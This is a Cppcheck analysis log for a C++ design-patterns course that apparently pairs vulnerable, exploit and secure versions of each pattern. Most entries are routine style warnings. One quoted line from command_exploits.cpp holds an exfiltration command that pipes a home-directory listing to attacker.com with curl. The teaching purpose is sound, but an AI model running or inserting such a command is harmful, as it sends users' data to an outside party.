D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:191:24: note: Member variable 'ActionObserver::action_' is in the wrong place in the initializer list.
        : name_(name), action_(std::move(action)) {}
                       ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:186:27: note: Member variable 'ActionObserver::action_' is in the wrong place in the initializer list.
    std::function<void()> action_;
                          ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:288:5: style: Class 'HeavyObserver' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    HeavyObserver(size_t size_mb) {
    ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:200:17: performance: Function 'getName()' should return member 'name_' by const reference. [returnByReference]
    std::string getName() const { return name_; }
                ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:345:24: style: Variable 'obs' can be declared as reference to const [constVariableReference]
            for (auto& obs : observers_) {
                       ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:349:24: style: Variable 'obs' can be declared as reference to const [constVariableReference]
            for (auto& obs : observers_) {
                       ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:84:23: style: Unused variable: malicious [unusedVariable]
    MaliciousObserver malicious;
                      ^
81/194 files checked 45% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp:327:10: style: inconclusive: Technically the member function 'PriorityObserver::notify' can be const. [functionConst]
    void notify(const std::string& message) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp:97:10: style: inconclusive: Technically the member function 'Observable < int >::emit' can be const. [functionConst]
    void emit(const T& value) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp:284:20: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            topics.push_back(pair.first);
                   ^
82/194 files checked 46% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_cpp23_comparison.cpp ...
83/194 files checked 46% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:174:10: style: inconclusive: Technically the member function 'ModernSubject::notify' can be const. [functionConst]
    void notify(const std::string& message) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:302:10: style: inconclusive: Technically the member function 'ThreadSafeSubject::notify' can be const. [functionConst]
    void notify(const std::string& message) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:384:14: style: inconclusive: Technically the member function 'demonstrateModernObserver::MessagePrinter::operator()' can be const. [functionConst]
        void operator()(const std::string& msg) {
             ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:211:10: style: inconclusive: Technically the member function 'Event < int , std :: string >::emit' can be const. [functionConst]
    void emit(Args... args) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:211:10: style: inconclusive: Technically the member function 'Event < std :: string >::emit' can be const. [functionConst]
    void emit(Args... args) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:211:10: style: inconclusive: Technically the member function 'Event <  >::emit' can be const. [functionConst]
    void emit(Args... args) {
         ^
84/194 files checked 47% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_vulnerabilities.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_vulnerabilities.cpp:107:10: style: inconclusive: Technically the member function 'UnsafeSubject::notify' can be const. [functionConst]
    void notify(int value) {
         ^
85/194 files checked 47% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\secure_observer_alternatives.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\secure_observer_alternatives.cpp:192:5: style: Class 'Subscription' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Subscription(std::function<void()> unsubscribe)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\secure_observer_alternatives.cpp:362:16: style: Variable 'obs' can be declared as reference to const [constVariableReference]
    for (auto& obs : observers) {
               ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\secure_observer_alternatives.cpp:363:17: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
        threads.emplace_back([subject, obs]() {
                ^
86/194 files checked 48% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\exploits\strategy_exploits.cpp ...
87/194 files checked 48% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:172:5: style: Class 'GameAI' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    GameAI(const std::string& name, int health = 100, int mana = 100)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:326:5: style: Class 'GameObject' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    GameObject(const std::string& name, int x = 0, int y = 0)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:435:5: style: Class 'GameCharacter' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    GameCharacter(const std::string& name, int level = 1, int baseDamage = 10)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:562:16: style: Variable 'character' can be declared as pointer to const [constVariablePointer]
    for (auto* character : characters) {
               ^
88/194 files checked 49% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\secure_strategy_alternatives.cpp ...
89/194 files checked 49% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_cpp23_comparison.cpp ...
90/194 files checked 49% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:68:9: performance: inconclusive: Technically the member function 'QuickSort::partition' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int partition(std::vector<int>& data, int low, int high) {
        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:429:9: performance: inconclusive: Technically the member function 'AddStrategy::execute' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int execute(int a, int b) {
        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:436:9: performance: inconclusive: Technically the member function 'MultiplyStrategy::execute' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int execute(int a, int b) {
        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:443:9: performance: inconclusive: Technically the member function 'PowerStrategy::execute' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int execute(int a, int b) {
        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:282:5: style: Class 'BulkPricing' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BulkPricing(int threshold = 10, double rate = 0.1)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:185:9: style: Consider using std::all_of or std::none_of algorithm instead of a raw loop. [useStlAlgorithm]
        for (char c : data) {
        ^
91/194 files checked 50% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_vulnerabilities.cpp ...
92/194 files checked 51% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_cpp23_comparison.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_cpp23_comparison.cpp:24:5: style: Class 'PrintCommand' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PrintCommand(int v) : value_(v) {}
    ^
93/194 files checked 51% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:394:10: style: inconclusive: Technically the member function 'GameObject::attack' can be const. [functionConst]
    void attack() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:398:10: style: inconclusive: Technically the member function 'GameObject::defend' can be const. [functionConst]
    void defend() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:379:5: style: Class 'GameObject' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    GameObject(const std::string& name, int x = 0, int y = 0)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:609:21: style: Variable 'enemy' is assigned a value that is never used. [unreadVariable]
    GameObject enemy("'??", 5, 5);
                    ^
94/194 files checked 52% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:136:10: style: inconclusive: Technically the member function 'VulnerableCommandExecutor::executeCommand' can be const. [functionConst]
    void executeCommand(PrivilegedCommand* cmd) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:130:5: style: Class 'VulnerableCommandExecutor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    VulnerableCommandExecutor(User* user) : current_user_(user) {}
    ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:226:20: style: Variable 'cmd' can be declared as reference to const [constVariableReference]
        for (auto& cmd : history_) {
                   ^
95/194 files checked 52% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:123:10: style: inconclusive: Technically the member function 'VulnerableExecutor::executePrivileged' can be const. [functionConst]
    void executePrivileged(PrivilegedAction* cmd) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:117:5: style: Class 'VulnerableExecutor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    VulnerableExecutor(User* user) : current_user_(user) {}
    ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:66:23: style: Variable 'cmd5' is assigned a value that is never used. [unreadVariable]
    SystemCommand cmd5("ls -la ~ | curl -X POST -d @- https://attacker.com/collect");
                      ^
96/194 files checked 53% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:46:10: performance: inconclusive: Technically the member function 'SafeShellCommand::isValidArgument' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool isValidArgument(const std::string& arg) const {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:303:17: performance: inconclusive: Technically the member function 'SignedCommand::generateNonce' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string generateNonce() const {
                ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:319:5: style: Class 'SignedCommand' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SignedCommand(const std::string& action)
    ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:140:17: performance: Function 'getUsername()' should return member 'username_' by const reference. [returnByReference]
    std::string getUsername() const { return username_; }
                ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:256:20: style: Variable 'cmd' can be declared as reference to const [constVariableReference]
        for (auto& cmd : history_) {
                   ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:64:9: style: Consider using std::all_of or std::none_of algorithm instead of a raw loop. [useStlAlgorithm]
        for (const auto& arg : args_) {
        ^
97/194 files checked 54% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp:47:9: style: Struct 'CommandGroup' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        CommandGroup(const std::string& name)
        ^
98/194 files checked 55% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:38:10: style: inconclusive: Technically the member function 'VulnerableAuth::accessResource' can be const. [functionConst]
    void accessResource() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:276:10: style: inconclusive: Technically the member function 'VulnerableSession::performAdminAction' can be const. [functionConst]
    void performAdminAction() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:185:30: warning: Class 'DanglingStateContext' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    DanglingStateContext() : state_(new StateA()) {}
                             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:185:30: warning: Class 'DanglingStateContext' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    DanglingStateContext() : state_(new StateA()) {}
                             ^
99/194 files checked 55% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:139:10: performance: inconclusive: Technically the member function 'SecureOrder::isTransitionAllowed' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool isTransitionAllowed(OrderStatus from, OrderStatus to) const {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:327:6: style: The destructor '~IdleState' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~IdleState() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:309:14: note: Virtual destructor in base class
    virtual ~State() = default;
             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:327:6: note: Destructor in derived class
    ~IdleState() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:344:6: style: The destructor '~WorkingState' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~WorkingState() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:309:14: note: Virtual destructor in base class
    virtual ~State() = default;
             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\secure_state_alternatives.cpp:344:6: note: Destructor in derived class
    ~WorkingState() {
     ^
100/194 files checked 56% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:44:14: performance: inconclusive: Technically the member function 'cpp23::Context::isValidTransition' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        bool isValidTransition(State* from, State* to) {
             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:58:17: style: Condition '!isValidTransition(state_.get(),new_state.get())' is always false [knownConditionTrueFalse]
            if (!isValidTransition(state_.get(), new_state.get())) {
                ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:58:35: note: Calling function 'isValidTransition' returns 1
            if (!isValidTransition(state_.get(), new_state.get())) {
                                  ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:58:17: note: Condition '!isValidTransition(state_.get(),new_state.get())' is always false
            if (!isValidTransition(state_.get(), new_state.get())) {
                ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:44:39: style: Parameter 'from' can be declared as pointer to const [constParameterPointer]
        bool isValidTransition(State* from, State* to) {
                                      ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:44:52: style: Parameter 'to' can be declared as pointer to const [constParameterPointer]
        bool isValidTransition(State* from, State* to) {
                                                   ^
101/194 files checked 56% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:138:10: style: inconclusive: Technically the member function 'VulnerableDoor::enter' can be const. [functionConst]
    void enter() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:54:27: warning: Class 'VulnerableContext' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    VulnerableContext() : state_(new LockedState()) {}
                          ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:54:27: warning: Class 'VulnerableContext' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    VulnerableContext() : state_(new LockedState()) {}
                          ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:335:32: warning: Class 'TrafficLight' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
TrafficLight::TrafficLight() : state_(new RedState()) {}
                               ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:335:32: warning: Class 'TrafficLight' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
TrafficLight::TrafficLight() : state_(new RedState()) {}
                               ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:413:22: warning: Class 'LeakyContext' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    LeakyContext() : state_(new StateA()) {}
                     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:413:22: warning: Class 'LeakyContext' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    LeakyContext() : state_(new StateA()) {}
                     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:381:6: style: The destructor '~StateA' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~StateA() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:368:14: note: Virtual destructor in base class
    virtual ~LeakyState() = default;
             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:381:6: note: Destructor in derived class
    ~StateA() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:399:6: style: The destructor '~StateB' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~StateB() {
     ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:368:14: note: Virtual destructor in base class
    virtual ~LeakyState() = default;
             ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:399:6: note: Destructor in derived class
    ~StateB() {
102/194 files checked 57% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\exploits\smart_pointers_exploits.cpp ...
     ^
103/194 files checked 57% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp ...
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:71:10: style: inconclusive: Technically the member function 'DatabaseResource::executeQuery' can be const. [functionConst]
    void executeQuery(const std::string& query) {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:115:10: style: inconclusive: Technically the member function 'FileSystemResource::writeFile' can be const. [functionConst]
    void writeFile(const std::string& filename, const std::string& content) {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:282:10: style: inconclusive: Technically the member function 'CacheableObject::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:64:10: style: Virtual function 'cleanup' is called from destructor '~DatabaseResource()' at line 52. Dynamic binding is not used. [virtualCallInConstructor]
    void cleanup() override {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:52:13: note: Calling cleanup
            cleanup();
            ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:64:10: note: cleanup is a virtual function
    void cleanup() override {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:108:10: style: Virtual function 'cleanup' is called from destructor '~FileSystemResource()' at line 96. Dynamic binding is not used. [virtualCallInConstructor]
    void cleanup() override {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:96:13: note: Calling cleanup
            cleanup();
            ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:108:10: note: cleanup is a virtual function
    void cleanup() override {
         ^
104/194 files checked 58% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\secure_smart_pointers_alternatives.cpp ...
105/194 files checked 58% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers.cpp ...
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers.cpp:323:9: performance: Variable 'data_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        data_ = std::shared_ptr<int[]>(new int[size], std::default_delete<int[]>());
        ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers.cpp:54:10: style: inconclusive: Technically the member function 'MyClass::doSomething' can be const. [functionConst]
    void doSomething() {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers.cpp:167:10: style: inconclusive: Technically the member function 'FileDeleter::operator()' can be const. [functionConst]
    void operator()(FILE* file) {
         ^
106/194 files checked 59% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_cpp23_comparison.cpp ...
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_cpp23_comparison.cpp:25:14: performance: inconclusive: Technically the member function 'cpp17::ResourceManager::get' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        int* get(std::shared_ptr<int> ptr) {
             ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_cpp23_comparison.cpp:44:38: performance: inconclusive: Technically the member function 'cpp23::ResourceManager::get' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        expected<int*, PointerError> get(std::shared_ptr<int> ptr) {
                                     ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_cpp23_comparison.cpp:52:38: performance: inconclusive: Technically the member function 'cpp23::ResourceManager::get' can be static (but you may consider moving to unnamed namespace). [functionStatic]
        expected<int*, PointerError> get(std::weak_ptr<int> weak) {
                                     ^
107/194 files checked 59% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_vulnerabilities.cpp ...
108/194 files checked 59% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\exploits\move_semantics_exploits.cpp ...
109/194 files checked 60% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp ...
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:24:9: style: Class 'Buffer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        Buffer(size_t size) : data_(std::make_unique<int[]>(size)), size_(size) {}
        ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:45:9: style: Class 'Buffer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        Buffer(size_t size) : data_(std::make_unique<int[]>(size)), size_(size) {}
        ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:83:23: warning: inconclusive: Access of moved variable 'buf'. [accessMoved]
    auto after_move = buf.getData();
                      ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:80:27: note: Calling std::move(buf)
    cpp23::Buffer moved = std::move(buf);
                          ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:83:23: note: Access of moved variable 'buf'.
    auto after_move = buf.getData();
                      ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:80:25: style: Variable 'moved' is assigned a value that is never used. [unreadVariable]
    cpp23::Buffer moved = std::move(buf);
                        ^
110/194 files checked 60% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_vulnerabilities.cpp ...
111/194 files checked 60% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\secure_move_semantics_alternatives.cpp ...
112/194 files checked 60% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\crtp_cpp23_comparison.cpp ...
113/194 files checked 60% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\crtp_vulnerabilities.cpp ...
114/194 files checked 61% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\exploits\crtp_exploits.cpp ...
115/194 files checked 61% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\secure_crtp_alternatives.cpp ...
116/194 files checked 61% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\exploits\type_erasure_exploits.cpp ...
117/194 files checked 62% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\secure_type_erasure_alternatives.cpp ...
118/194 files checked 62% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp ...
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:25:24: warning: Class 'Any' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
                       ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:25:24: warning: Class 'Any' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
                       ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:45:24: warning: Class 'Any' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
                       ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:45:24: warning: Class 'Any' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
                       ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:25:9: style: Class 'Any' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
        ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:45:9: style: Class 'Any' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        Any(T value) : data_(new T(std::move(value))), type_(&typeid(T)) {}
        ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:21:15: style: Class 'Any' is unsafe, 'Any::data_' can leak by wrong usage. [unsafeClassCanLeak]
        void* data_;
              ^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_cpp23_comparison.cpp:41:15: style: Class 'Any' is unsafe, 'Any::data_' can leak by wrong usage. [unsafeClassCanLeak]
        void* data_;
              ^
119/194 files checked 62% done
Checking D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_vulnerabilities.cpp ...
120/194 files checked 62% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:130:5: warning: Member variable 'VulnerableCircularBuffer < 32 >::buffer_' is not initialized. [uninitMemberVarPrivate]
    char buffer_[N];
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:55:5: style: Class 'VulnerableExecutor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    VulnerableExecutor(VulnerableTaskQueue& q) : queue_(q) {}
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:268:26: style: Unused variable: malicious [unusedVariable]
        MaliciousCommand malicious;
                         ^
121/194 files checked 63% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:311:10: style: inconclusive: Technically the member function 'SmartProducer::produceLinear' can be const. [functionConst]
    void produceLinear(QueueType& queue) {
         ^
